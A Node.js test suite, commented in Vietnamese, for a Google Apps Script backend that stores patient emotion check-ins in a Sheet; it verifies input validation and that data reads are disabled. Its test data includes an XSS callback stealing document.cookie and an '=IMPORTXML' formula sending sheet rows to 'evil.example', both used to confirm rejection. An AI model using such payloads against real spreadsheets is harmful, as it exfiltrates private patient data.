/* =========================================================
   Test google_apps_script.js bằng Node (QA): giả lập SpreadsheetApp / ContentService /
   LockService / Utilities rồi gọi doGet / doPost như Apps Script sẽ gọi.
   Không gọi mạng, không đụng Sheet thật. Chạy: node tests/test-gas.js   (FAIL → exit 1)
   Kiểm: doGet không trả dữ liệu, JSONP callback được lọc, doPost whitelist 10 mức / 6 cảm xúc,
   Mã số bệnh nhân (01/11/2026: bỏ khoảng trắng/chấm/gạch, còn 3–20 chữ số, giữ số 0 đầu), chặn công thức
   = + - @, giới hạn độ dài, LockService, ghi đúng tab theo tên, giờ: giờ máy chủ − ageMs hợp lệ (0…8 ngày)
   hoặc giờ máy chủ, cùng Mã phiên + cùng mã số thì cập nhật và giữ cột A, khác mã số thì session_conflict,
   Mã phiên bắt buộc (dự án mới không nhận app cũ), B1 "Số điện thoại" tự đổi thành "Mã số bệnh nhân".
   Cuối file: kiểm nhanh google_apps_script-du-an-cu.js (bản cho dự án CŨ) vẫn tắt doGet và nhận app cũ.
   ========================================================= */
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const APP = path.resolve(__dirname, '..');
const SRC = fs.readFileSync(path.join(APP, 'google_apps_script.js'), 'utf8');
const SRC_OLD = fs.readFileSync(path.join(APP, 'google_apps_script-du-an-cu.js'), 'utf8');
let fails = 0;
let passes = 0;
const T = (name, ok, detail) => { if (ok) passes++; else fails++; console.log((ok ? 'PASS ' : 'FAIL ') + name + (detail !== undefined ? '  → ' + String(detail).replace(/\s+/g, ' ').slice(0, 240) : '')); };

/* ===== Giả lập Sheet ===== */
function makeSheet(name) {
  const s = { name, rows: [], frozen: 0, hidden: [], fmt: [], numFmt: [] };
  s.getLastRow = () => s.rows.length;
  s.appendRow = r => { s.rows.push(r.slice()); };
  s.setFrozenRows = n => { s.frozen = n; };
  s.hideColumns = c => { s.hidden.push(c); };
  s.deleteRow = n => { s.rows.splice(n - 1, 1); };
  s.getRange = (r, c, nr, nc) => ({
    getValues: () => Array.from({ length: nr || 1 }, (_, i) => Array.from({ length: nc || 1 }, (_, j) => { const row = s.rows[r - 1 + i] || []; return row[c - 1 + j] == null ? '' : row[c - 1 + j]; })),
    setValues(vals) { vals.forEach((v, i) => { const row = s.rows[r - 1 + i] || (s.rows[r - 1 + i] = []); v.forEach((x, j) => { row[c - 1 + j] = x; }); }); return this; },
    getValue: () => { const row = s.rows[r - 1] || []; return row[c - 1] == null ? '' : row[c - 1]; },
    setValue(x) { const row = s.rows[r - 1] || (s.rows[r - 1] = []); row[c - 1] = x; return this; },
    setNumberFormat(f) { s.numFmt.push(r + ',' + c + ',' + (nr || 1) + 'x' + (nc || 1) + '=' + f); return this; },
    setFontWeight(x) { s.fmt.push(x); return this; }, setBackground(x) { s.fmt.push(x); return this; }, setFontColor(x) { s.fmt.push(x); return this; }
  });
  return s;
}

function load(opts) {
  const o = opts || {};
  const src = o.src || SRC;
  const sheets = {};
  let active = null;
  const ss = {
    getSheetByName: n => sheets[n] || null,
    insertSheet: n => (sheets[n] = makeSheet(n)),
    getActiveSheet: () => active
  };
  const lock = { waits: 0, held: 0, max: 0, fail: !!o.lockFail };
  const sandbox = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ss },
    ContentService: { MimeType: { JSON: 'json', JAVASCRIPT: 'js' }, createTextOutput: t => ({ text: t, mime: null, setMimeType(m) { this.mime = m; return this; }, getContent() { return this.text; } }) },
    LockService: { getScriptLock: () => ({ waitLock() { if (lock.fail) throw new Error('Lock timeout'); lock.waits++; lock.held++; lock.max = Math.max(lock.max, lock.held); }, releaseLock() { lock.held--; } }) },
    /* Ghi kèm mốc thời gian để test biết giờ lấy từ đâu */
    Utilities: { formatDate: (d, tz, f) => 'TZ[' + tz + '|' + f + '|' + d.getTime() + ']' },
    Logger: { log() {} },
    console
  };
  vm.createContext(sandbox);
  vm.runInContext(src, sandbox, { filename: o.src ? 'google_apps_script-du-an-cu.js' : 'google_apps_script.js' });
  if (o.setup) o.setup(sheets, s => { active = s; });
  const P = body => JSON.parse(sandbox.doPost({ postData: { contents: typeof body === 'string' ? body : JSON.stringify(body) } }).getContent());
  const G = p => sandbox.doGet({ parameter: p || {} });
  return { sandbox, sheets, lock, P, G, setActive: s => { active = s; } };
}

const sid = n => 'sess-0000-' + String(n).padStart(4, '0');
const tsOf = cell => Number((/\|(\d+)\]$/.exec(String(cell)) || [])[1]);
const TZ_RE = /^TZ\[Asia\/Ho_Chi_Minh\|HH:mm:ss dd\/MM\/yyyy\|\d+\]$/;
/* Payload ĐÚNG như app cũ (ditruyenhungvuong/checkin f76adc9): dự án mới phải từ chối, bản dự án cũ phải nhận */
const LEGACY = { created_at: '08:00:00 01/10/2026', phone: '0912345678', part1: '7 - Tốt', part2: 'Vui vẻ' };
/* Payload bản 30/10/2026 (checkin-V2, trường phone, có Mã phiên) */
const V2 = { sessionId: sid(9), phone: '0912345678', level: 3, part1: '3 - Tồi tệ', part2: 'Lo lắng' };
const OK = { sessionId: sid(1), patientId: '26012345', level: 3, part1: '3 - Tồi tệ', part2: 'Lo lắng' };
const OLD_HEADER = ['Thời gian', 'Số điện thoại', 'Phần 1: Mức cảm xúc', 'Phần 2: Cảm xúc Capybara'];
const NEW_HEADER = 'Thời gian|Mã số bệnh nhân|Phần 1: Mức cảm xúc|Phần 2: Cảm xúc Capybara|Mã phiên';
const noFormula = sh => sh.rows.every(r => r.every(c => !/^[=+\-@]/.test(String(c))));

/* ===== doGet: không còn đọc dữ liệu ===== */
{
  const env = load();
  env.sheets.CheckIn = makeSheet('CheckIn');
  env.sheets.CheckIn.rows.push(OLD_HEADER, ['08:00:00 01/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn']);
  const out = env.G({});
  T('doGet: trả public_read_disabled, MimeType JSON', out.getContent() === '{"result":"error","error":"public_read_disabled"}' && out.mime === 'json', out.getContent());
  T('doGet: không lộ dữ liệu dù Sheet có dữ liệu', !/0911111111|Rất tồi tệ/.test(out.getContent()));
  const jp = env.G({ callback: 'alert(document.cookie)//' });
  T('doGet: bỏ JSONP – có ?callback= vẫn trả JSON thuần, không trả JavaScript', jp.getContent() === '{"result":"error","error":"public_read_disabled"}' && jp.mime === 'json', jp.getContent());
  T('Nguồn: doGet không gọi getRange/getValues (không có đường đọc bảng)', !/function doGet[\s\S]*?\n}/.exec(SRC)[0].match(/getRange|getValues|sheet_\(/));
}

/* ===== doPost: luồng đúng ===== */
{
  const env = load({ setup: (sheets, setActive) => { setActive((sheets.Khac = makeSheet('Khac'))); } });
  const r = env.P(OK);
  const sh = env.sheets.CheckIn;
  T('POST hợp lệ → success inserted, không trả số dòng', JSON.stringify(r) === '{"result":"success","action":"inserted"}', JSON.stringify(r));
  T('Ghi đúng tab tên "CheckIn" (tự tạo), không ghi vào tab đang mở "Khac"', !!sh && env.sheets.Khac.rows.length === 0);
  T('Tab trống: 5 tiêu đề (B "Mã số bệnh nhân"), đóng băng hàng 1, ẩn cột E', sh.rows[0].join('|') === NEW_HEADER && sh.frozen === 1 && sh.hidden.includes(5), sh.rows[0].join('|'));
  T('Dòng ghi: giờ Asia/Ho_Chi_Minh (không ageMs → giờ máy chủ), mã số, "3 - Tồi tệ", "Lo lắng", Mã phiên', TZ_RE.test(sh.rows[1][0]) && Math.abs(tsOf(sh.rows[1][0]) - Date.now()) < 5000 && JSON.stringify(sh.rows[1].slice(1)) === JSON.stringify(['26012345', '3 - Tồi tệ', 'Lo lắng', sid(1)]), JSON.stringify(sh.rows[1]));
  T('Dòng ghi đặt định dạng văn bản @ chỉ cho dòng đó (giữ số 0 đầu)', sh.numFmt.includes('2,1,1x5=@') && sh.numFmt.length === 1, sh.numFmt.join(' '));
  T('LockService: chờ khóa và nhả khóa', env.lock.waits === 1 && env.lock.held === 0);
  const colA = sh.rows[1][0];
  const r2 = env.P(Object.assign({}, OK, { patientId: '260 123 45', level: 4, part1: '4 - Kém', ageMs: 3 * 864e5 }));
  T('Cùng Mã phiên + cùng mã số ("260 123 45" = 26012345) → updated, vẫn 1 dòng, cập nhật mức, GIỮ cột A', r2.action === 'updated' && sh.rows.length === 2 && sh.rows[1][2] === '4 - Kém' && sh.rows[1][0] === colA, JSON.stringify(r2) + ' ' + JSON.stringify(sh.rows[1]));
  T('Cập nhật: định dạng @ chỉ đặt cho B–E của dòng đó', sh.numFmt[sh.numFmt.length - 1] === '2,2,1x4=@', sh.numFmt.join(' '));
  const r3 = env.P(Object.assign({}, OK, { patientId: '26099999', level: 10, part2: 'Vui vẻ' }));
  T('Cùng Mã phiên mà KHÁC mã số → session_conflict, dòng cũ không đổi', JSON.stringify(r3) === '{"result":"error","error":"session_conflict"}' && sh.rows[1][1] === '26012345' && sh.rows[1][2] === '4 - Kém' && sh.rows.length === 2, JSON.stringify(r3) + ' ' + JSON.stringify(sh.rows[1]));
  env.P(Object.assign({}, OK, { sessionId: sid(5), patientId: '26012345', level: '8', part1: '=HYPERLINK("https://evil";"x")', part2: 'Hoảng hốt', created_at: '=NOW()' }));
  T('part1 client gửi bị bỏ, server ghép lại từ bảng; created_at client bị bỏ', sh.rows[2] && sh.rows[2][2] === '8 - Rất tốt' && TZ_RE.test(sh.rows[2][0]), JSON.stringify(sh.rows[2]));
  T('Không ô nào trong Sheet bắt đầu bằng = + - @', noFormula(sh));
}

/* ===== Mã số bệnh nhân: chỉ chữ số, 3–20 số sau khi bỏ khoảng trắng/chấm/gạch ===== */
{
  const env = load();
  const sh = () => env.sheets.CheckIn;
  const keep = [
    ['26012345', '26012345'],
    ['0012345', '0012345'],
    ['260 123 45', '26012345'],
    ['260.123.45', '26012345'],
    ['260-123-45', '26012345'],
    ['  26012345  ', '26012345'],
    ['123', '123'],
    ['1'.repeat(20), '1'.repeat(20)],
    ['00 000 000 000 000 000 01', '0000000000000000001'],
    ['-26012345 (dấu gạch đầu bị bỏ như mọi dấu gạch)', '26012345'],
    ['0912345678', '0912345678']
  ];
  const got = keep.map(([raw, want], i) => {
    const r = env.P(Object.assign({}, OK, { sessionId: sid(200 + i), patientId: raw.replace(/ \(.*\)$/, '') }));
    const b = r.result === 'success' ? sh().rows[sh().rows.length - 1][1] : '';
    return { raw, ok: r.result === 'success' && b === want && typeof b === 'string' && /^\d+$/.test(b), got: JSON.stringify(r) + ' B=' + b };
  });
  T('Mã số: ' + keep.length + ' mẫu hợp lệ (26012345, "0012345" giữ số 0, "260 123 45", chấm, gạch, 3 số, 20 số…) ghi đúng, cột B chỉ chữ số', got.every(g => g.ok), got.filter(g => !g.ok).map(g => g.raw + ':' + g.got).join(' | '));
  T('Mã số "0012345": ô B là CHUỖI "0012345" và dòng đặt định dạng @ (Sheets không cắt số 0)', sh().rows.some(r => r[1] === '0012345') && sh().numFmt.every(f => f.endsWith('=@')));
  const drop = [
    ['"12" (2 số)', '12'],
    ['21 chữ số', '1'.repeat(21)],
    ['"HV123"', 'HV123'],
    ['"=1+1"', '=1+1'],
    ['rỗng', ''],
    ['chỉ khoảng trắng', '   '],
    ['"+26012345"', '+26012345'],
    ['"@26012345"', '@26012345'],
    ['"26012345abc"', '26012345abc'],
    ['"(026) 012345" (ngoặc)', '(026) 012345'],
    ['"260_123"', '260_123'],
    ['chữ số Ả Rập-Ấn "٢٦٠١٢٣"', '٢٦٠١٢٣'],
    ['=IMPORTXML(...)', '=IMPORTXML("https://evil.example/?d="&JOIN(";";B2:D500);"//a")'],
    ['41 ký tự (phần lớn là khoảng trắng)', '123' + ' '.repeat(38)],
    ['là số 26012345 (không phải chuỗi)', 26012345],
    ['là mảng', ['26012345']],
    ['null', null],
    ['thiếu trường', undefined]
  ];
  const dropped = drop.map(([n, raw], i) => { const b = Object.assign({}, OK, { sessionId: sid(250 + i), patientId: raw }); if (raw === undefined) delete b.patientId; const r = env.P(b); return { n, ok: r.error === 'patient_id_invalid' && !r.retry, r }; });
  T('Mã số: ' + drop.length + ' mẫu sai ("12", 21 chữ số, "HV123", "=1+1", rỗng, + @ đầu, ngoặc, chữ số ngoài ASCII, kiểu số/mảng…) → patient_id_invalid', dropped.every(d => d.ok), dropped.filter(d => !d.ok).map(d => d.n + ':' + JSON.stringify(d.r)).join(' | '));
  T('Mã số: không ô nào bắt đầu bằng = + - @', noFormula(sh()));
}

/* ===== Dự án mới KHÔNG nhận lượt thiếu Mã phiên hay trường phone cũ ===== */
{
  const env = load();
  const r1 = env.P(LEGACY);
  T('Payload app cũ f76adc9 (không Mã phiên) → session_invalid, không ghi', r1.error === 'session_invalid' && !env.sheets.CheckIn, JSON.stringify(r1));
  const r2 = env.P(V2);
  T('Payload bản 30/10 (trường phone, chưa có patientId) → patient_id_invalid, không ghi', r2.error === 'patient_id_invalid' && !env.sheets.CheckIn, JSON.stringify(r2));
  const r3 = env.P(Object.assign({}, OK, { level: undefined }));
  T('Thiếu level (không còn đọc số mức từ part1 "3 - Tồi tệ") → level_invalid', r3.error === 'level_invalid', JSON.stringify(r3));
  T('Nguồn: đã bỏ legacyPhone_, normalizePhone_, nhánh app cũ', !/legacyPhone_|normalizePhone_|LEGACY_PHONE/.test(SRC));
}

/* ===== ageMs: độ trễ từ lúc bấm tới lúc gửi, giờ = giờ nhận − ageMs (không phụ thuộc đồng hồ điện thoại) ===== */
{
  const env = load();
  const sh = () => env.sheets.CheckIn;
  const cases = [
    ['0 ms (gửi ngay) → giờ nhận', 0, true],
    ['1 giờ (gửi lại sau mất mạng) → giờ nhận − 1 giờ', 3600e3, true],
    ['6 ngày (hàng chờ 7 ngày) → giờ nhận − 6 ngày', 6 * 864e5, true],
    ['đúng 8 ngày → nhận', 8 * 864e5, true],
    ['9 ngày → giờ máy chủ', 9 * 864e5, false],
    ['âm (đồng hồ máy bị chỉnh lùi giữa chừng) → giờ máy chủ', -5000, false],
    ['chuỗi số → giờ máy chủ', '3600000', false],
    ['số lẻ → giờ máy chủ', 3600e3 + 0.5, false],
    ['null → giờ máy chủ', null, false],
    ['mốc tuyệt đối kiểu clientTs (Date.now()) → giờ máy chủ', Date.now(), false]
  ];
  const got = cases.map(([n, age, useAge], i) => {
    const t0 = Date.now();
    const r = env.P(Object.assign({}, OK, { sessionId: sid(100 + i), ageMs: age }));
    const t1 = Date.now();
    const a = tsOf(sh().rows[sh().rows.length - 1][0]);
    const want = useAge ? [t0 - age, t1 - age] : [t0, t1];
    const ok = r.result === 'success' && a >= want[0] && a <= want[1];
    return (ok ? 'ok ' : 'LỖI ') + n + ' (' + a + ')';
  });
  T('ageMs: 4 trường hợp 0…8 ngày ghi giờ nhận − ageMs, 6 trường hợp ngoài khoảng/sai kiểu ghi giờ máy chủ', got.every(x => x.startsWith('ok')), got.join(' | '));
  T('Nguồn: không còn nhận clientTs (giờ tuyệt đối của điện thoại)', !/clientTs/.test(SRC));
}

/* ===== Mức: whitelist chặt kiểu ===== */
{
  const env = load();
  const loose = [true, [7], '0x7', '1e1', ' 8 ', '7.0', 7.5, -1, 0, 11, {}];
  const got = loose.map(v => { const r = env.P(Object.assign({}, OK, { level: v, part1: '' })); return { v: JSON.stringify(v), ok: r.error === 'level_invalid' }; });
  T('Mức: true, [7], "0x7", "1e1", " 8 ", "7.0", 7.5, -1, 0, 11, {} đều bị từ chối', got.every(g => g.ok), got.filter(g => !g.ok).map(g => g.v).join(', '));
  T('Mức: 7 (số) và "7" (chuỗi số) được nhận', env.P(Object.assign({}, OK, { level: 7 })).result === 'success' && env.P(Object.assign({}, OK, { sessionId: sid(2), level: '7' })).result === 'success');
}

/* ===== doPost: chặn dữ liệu xấu ===== */
{
  const env = load();
  const bad = [
    ['patientId "=1+1+1+1+1"', Object.assign({}, OK, { patientId: '=1+1+1+1+1' }), 'patient_id_invalid'],
    ['patientId "abcdefghi"', Object.assign({}, OK, { patientId: 'abcdefghi' }), 'patient_id_invalid'],
    ['patientId thiếu', Object.assign({}, OK, { patientId: '' }), 'patient_id_invalid'],
    ['level 0', Object.assign({}, OK, { level: 0 }), 'level_invalid'],
    ['level 11', Object.assign({}, OK, { level: 11 }), 'level_invalid'],
    ['level 2.5', Object.assign({}, OK, { level: 2.5 }), 'level_invalid'],
    ['level "abc"', Object.assign({}, OK, { level: 'abc' }), 'level_invalid'],
    ['cảm xúc rỗng', Object.assign({}, OK, { part2: '' }), 'emotion_required'],
    ['cảm xúc ngoài 6 nhãn', Object.assign({}, OK, { part2: 'Hạnh phúc' }), 'emotion_invalid'],
    ['cảm xúc là công thức', Object.assign({}, OK, { part2: '@SUM(A1)' }), 'emotion_invalid'],
    ['sessionId có ký tự lạ', Object.assign({}, OK, { sessionId: '=1+1+1+1+1+1' }), 'session_invalid'],
    ['sessionId bắt đầu bằng "-"', Object.assign({}, OK, { sessionId: '-abcdefgh' }), 'session_invalid'],
    ['sessionId 7 ký tự', Object.assign({}, OK, { sessionId: 'abc-def' }), 'session_invalid'],
    ['sessionId là số', Object.assign({}, OK, { sessionId: 12345678 }), 'session_invalid'],
    ['sessionId 41 ký tự', Object.assign({}, OK, { sessionId: 'a'.repeat(41) }), 'session_invalid'],
    ['sessionId thiếu', Object.assign({}, OK, { sessionId: undefined }), 'session_invalid'],
    ['sessionId rỗng', Object.assign({}, OK, { sessionId: '' }), 'session_invalid'],
    ['cảm xúc là mảng', Object.assign({}, OK, { part2: ['Vui vẻ'] }), 'emotion_invalid']
  ];
  const got = bad.map(([n, body, code]) => { const r = env.P(body); return { n, ok: r.result === 'error' && r.error === code && !r.retry, r }; });
  T(bad.length + ' payload xấu đều bị từ chối đúng mã lỗi, không retry', got.every(g => g.ok), got.filter(g => !g.ok).map(g => g.n + ':' + JSON.stringify(g.r)).join(' | '));
  T('Payload xấu: không dòng nào được ghi (tab chưa tạo hoặc chỉ có tiêu đề)', !env.sheets.CheckIn || env.sheets.CheckIn.rows.length <= 1);
  T('Payload xấu: không chờ khóa (kiểm trước, ghi sau)', env.lock.waits === 0);
  T('Body > 2000 ký tự → too_large', env.P(JSON.stringify(Object.assign({}, OK, { pad: 'x'.repeat(2100) }))).error === 'too_large');
  T('Body không phải JSON → bad_json', env.P('khong phai json').error === 'bad_json');
  T('Body JSON là chuỗi "abc" → bad_json', env.P('"abc"').error === 'bad_json');
  T('Body JSON là mảng → bad_json', env.P('[1,2]').error === 'bad_json');
  T('Không postData → no_data', JSON.parse(env.sandbox.doPost({}).getContent()).error === 'no_data' && JSON.parse(env.sandbox.doPost(undefined).getContent()).error === 'no_data');
}

/* ===== Khóa bận → báo retry, không lộ lỗi nội bộ ===== */
{
  const env = load({ lockFail: true });
  const r = env.P(OK);
  T('Khóa bận: {result:error, error:server_busy, retry:true}, không kèm thông điệp nội bộ', JSON.stringify(r) === '{"result":"error","error":"server_busy","retry":true}', JSON.stringify(r));
}

/* ===== Tab đã có tiêu đề cũ "Số điện thoại" (dữ liệu ghi 30–31/10/2026) ===== */
{
  const env = load();
  env.sheets.CheckIn = makeSheet('CheckIn');
  env.sheets.CheckIn.rows.push(OLD_HEADER.concat(['Mã phiên']), ['08:00:00 31/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn', sid(77)]);
  env.P(OK);
  const sh = env.sheets.CheckIn;
  T('Tab cũ: B1 "Số điện thoại" đổi thành "Mã số bệnh nhân", không đụng A1, E1 và dòng cũ', sh.rows[0].join('|') === NEW_HEADER && sh.rows[1][1] === '0911111111' && sh.rows.length === 3 && sh.rows[2][1] === '26012345', JSON.stringify(sh.rows));
  T('Tab cũ: định dạng @ chỉ đặt cho dòng mới (dòng 3)', sh.numFmt.join(' ') === '3,1,1x5=@', sh.numFmt.join(' '));
  const env2 = load();
  env2.sheets.CheckIn = makeSheet('CheckIn');
  env2.sheets.CheckIn.rows.push(OLD_HEADER, ['08:00:00 01/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn']);
  env2.P(OK);
  T('Tab 4 cột: thêm E "Mã phiên" + ẩn, đổi B1, dòng cũ giữ nguyên', env2.sheets.CheckIn.rows[0].join('|') === NEW_HEADER && env2.sheets.CheckIn.hidden.includes(5) && env2.sheets.CheckIn.rows[1][1] === '0911111111', JSON.stringify(env2.sheets.CheckIn.rows[0]));
  const env3 = load();
  env3.sheets.CheckIn = makeSheet('CheckIn');
  env3.sheets.CheckIn.rows.push(['Thời gian', 'Mã BN (anh tự đặt)', 'Phần 1: Mức cảm xúc', 'Phần 2: Cảm xúc Capybara', 'Mã phiên']);
  env3.P(OK);
  T('Tab có tiêu đề B1 anh tự đặt (khác "Số điện thoại") → giữ nguyên chữ của anh', env3.sheets.CheckIn.rows[0][1] === 'Mã BN (anh tự đặt)');
}

/* ===== Nhãn khớp với script.js ===== */
{
  const js = fs.readFileSync(path.join(APP, 'script.js'), 'utf8');
  const levels = [];
  for (const m of js.matchAll(/^\s*(\d+):\s*\{\s*text:\s*"([^"]*)"/mg)) levels[Number(m[1])] = m[2];
  const env = load();
  T('LEVEL_TEXTS trùng emotionLevels trong script.js', JSON.stringify(env.sandbox.LEVEL_TEXTS.slice(1)) === JSON.stringify(levels.slice(1)), JSON.stringify(levels));
  const emo = (js.match(/const EMOTIONS = \[([^\]]*)\]/) || [])[1] || '';
  T('EMOTION_LABELS trùng EMOTIONS trong script.js', JSON.stringify(env.sandbox.EMOTION_LABELS) === JSON.stringify(emo.split(',').map(x => x.trim().replace(/^'|'$/g, ''))), emo);
  /* normalizePatientId hai phía phải cho cùng kết quả */
  const clientFn = (js.match(/function normalizePatientId\(raw\) \{[\s\S]*?\n\}/) || [''])[0];
  const ctx = {}; vm.createContext(ctx); vm.runInContext(clientFn, ctx);
  const samples = ['26012345', '0012345', '260 123 45', '260.123.45', '260-123-45', ' 26012345 ', '12', '123', '1'.repeat(20), '1'.repeat(21), 'HV123', '=1+1', '', null, '+260', '(26)012345', '٢٦٠', '26\u00a0012', '260\t123'];
  const diff = samples.filter(s => ctx.normalizePatientId(s) !== env.sandbox.normalizePatientId_(s));
  T('normalizePatientId (web) và normalizePatientId_ (server) giống nhau trên ' + samples.length + ' mẫu', clientFn && diff.length === 0, diff.join(', '));
  T('Tên trường gửi lên khớp hai phía: web gửi patientId, server đọc data.patientId', /patientId: payload\.patientId/.test(js) && /data\.patientId/.test(SRC) && !/\bphone:/.test(js));
}

/* ===== Nguồn: hướng dẫn cài và các chốt ===== */
T('Nguồn: hướng dẫn chỉ đúng dự án mới (Sheet bản an toàn 30-10-2026, URL AKfycbzfN8…), cập nhật Phiên bản mới giữ URL', /bản an toàn 30-10-2026/.test(SRC) && /AKfycbzfN8/.test(SRC) && /Phiên bản mới \(New version\)/.test(SRC) && /GIỮ NGUYÊN URL/.test(SRC));
T('Nguồn: BƯỚC 2 dùng hàm tạm chayThu (Apps Script giấu hàm tên kết thúc "_"), dặn xóa sau khi chạy', /function chayThu\(\) \{ test_\(\); \}/.test(SRC) && /GIẤU các hàm có tên kết thúc bằng dấu gạch dưới/.test(SRC) && /XÓA dòng  function chayThu/.test(SRC) && !/^function chayThu/m.test(SRC));
T('Nguồn: hướng dẫn nói rõ đổi phone → patientId, làm bước 3–4 liền nhau', /phone → patientId/.test(SRC) && /bước 3–4 liền nhau/.test(SRC));
T('Nguồn: test_ dùng mã số có số 0 đầu và kiểm cột B giữ số 0', /patientId: '0012 345'/.test(SRC) && /b === '0012345'/.test(SRC));
T('Nguồn: không dùng getActiveSheet()', !/getActiveSheet\(/.test(SRC.replace(/\/\*[\s\S]*?\*\/|\/\/.*$/gm, '')));
T('Nguồn: không còn ALLOW_PUBLIC_READ hay đường đọc toàn bảng', !/ALLOW_PUBLIC_READ|readAll_/.test(SRC));
T('Nguồn: không còn trả JavaScript (JSONP)', !/MimeType\.JAVASCRIPT/.test(SRC));
T('Nguồn: giữ safeText_, setNumberFormat(\'@\'), LockService', /function safeText_/.test(SRC) && /setNumberFormat\('@'\)/.test(SRC) && /LockService\.getScriptLock/.test(SRC));

/* ===== Bản cho dự án CŨ (google_apps_script-du-an-cu.js): vẫn tắt doGet và nhận app cũ ===== */
{
  const env = load({ src: SRC_OLD });
  T('Dự án cũ: file có ghi chú "CHỈ DÀNH CHO DỰ ÁN APPS SCRIPT CŨ", không làm BƯỚC 5', /CHỈ DÀNH CHO DỰ ÁN APPS SCRIPT CŨ/.test(SRC_OLD) && /KHÔNG làm BƯỚC 5/.test(SRC_OLD));
  T('Dự án cũ: doGet trả public_read_disabled', env.G({}).getContent() === '{"result":"error","error":"public_read_disabled"}');
  const r = env.P(LEGACY);
  T('Dự án cũ: payload app cũ f76adc9 vẫn ghi được, chặn công thức', r.result === 'success' && env.P(Object.assign({}, LEGACY, { phone: '=1+1+1+1+1' })).error === 'phone_invalid' && noFormula(env.sheets.CheckIn), JSON.stringify(r));
}

console.log('\n' + passes + ' PASS, ' + fails + ' FAIL (Apps Script giả lập)');
process.exit(fails ? 1 : 0);
